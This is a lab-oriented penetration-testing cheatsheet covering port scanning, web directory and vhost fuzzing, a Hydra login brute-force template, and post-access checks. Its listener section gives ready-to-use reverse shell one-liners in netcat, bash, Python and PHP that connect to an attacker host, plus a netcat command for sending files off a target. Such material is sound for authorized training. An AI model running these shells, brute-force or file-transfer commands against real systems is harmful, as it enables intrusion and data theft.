# Enumeration & Initial Access — Cheatsheet

> Quick, lab-focused reference for enumeration, web fuzzing, credential checks, and basic reverse shells.  
> **Use only in authorized, isolated lab environments.** Redact real IPs/credentials in public notes.

---

## Quick workflow
1. Recon / port scan  
2. Service enumeration (banner/version, HTTP content, SMB/FTP, etc.)  
3. Web testing: host headers, virtual hosts, dir fuzzing, login pages  
4. Credential checks / brute force (only on lab targets)  
5. Gain initial access (lab shells)  
6. Post-access enumeration for privilege escalation

---

## Port scanning
- Full TCP port scan: `nmap <TARGET_IP> -p- -T4 -v`  
- Scan specific ports with service detection: `nmap <TARGET_IP> -p 22,80 -A`

---

## HTTP / hosts / basic web checks
- Add host mapping: edit `/etc/hosts` and add: `<TARGET_IP> example.lab`  
- Basic web scan: `nikto -host <TARGET_IP>`  
- If a login page is present, search for default creds or app-specific CVEs (lab-only).

---

## Directory & vhost fuzzing
- dirsearch: `dirsearch -u http://example.lab`  
- gobuster dir: `gobuster dir -u http://example.lab/ -w /usr/share/seclists/Discovery/Web-Content/big.txt`  
- ffuf: `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://example.lab/FUZZ`  
- gobuster vhost: `gobuster vhost -u http://example.lab/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`  
**Tips:** inspect page source, cookies, JS for endpoints or usernames; use Burp Suite for interactive testing.

---

## Brute forcing / credential testing (LAB ONLY)
- Hydra template (adjust to form and failure string):  
  `hydra -l admin -P /path/to/passlist.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"`  
  Replace `"Invalid login"` with the real failure string from the form. Confirm permission to test brute force.

---

## Service-specific checks
- For services like FTP, Samba, etc., research lab-safe exploits and check for anonymous access, writeable shares, or known CVEs.

---

## Listeners & reverse shells
- Start a listener: `nc -nvlp 5555`  
- Netcat (if `-e` available): `nc -e /bin/sh <ATTACKER_IP> <PORT>`  
- Bash reverse shell: `bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1`  
- Python reverse shell: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`  
- PHP reverse shell (if php CLI available): `php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`  
*(PowerShell variants for Windows are available in many cheat sheets — keep a trusted local copy.)*

---

## Transferring files (netcat)
- On attacker (receive): `nc -nvlp <LOCAL_PORT> > output-file`  
- On target (send): `nc <ATTACKER_IP> <LOCAL_PORT> < file-to-send`

---

## Post-shell basics (sanitized)
- Immediately run: `whoami`, `id`, `hostname`, `uname -a`, `pwd`, `ls -la`, `ps aux`  
- Check `sudo` rights: `sudo -l`  
- From there, look for SUID binaries, weak cron jobs, readable credentials, misconfigurations, etc. Document findings and remediation in `/reports/`.

---

## Safety & hygiene
- Always use placeholders in public notes (`<TARGET_IP>`, `<ATTACKER_IP>`, `LAB-BOX`).  
- Never publish real credentials or client-identifying information.  
- Prefer high-level descriptions and sanitized outputs for public posts.  
- Use isolated lab environments (VMs, containers, or dedicated lab networks).

---

## References & further reading
- Official docs for `nmap`, `ffuf`, `gobuster`, `dirsearch`, `nikto`, `hydra` and reverse-shell cheat sheets. Keep a curated local copy for lab use.
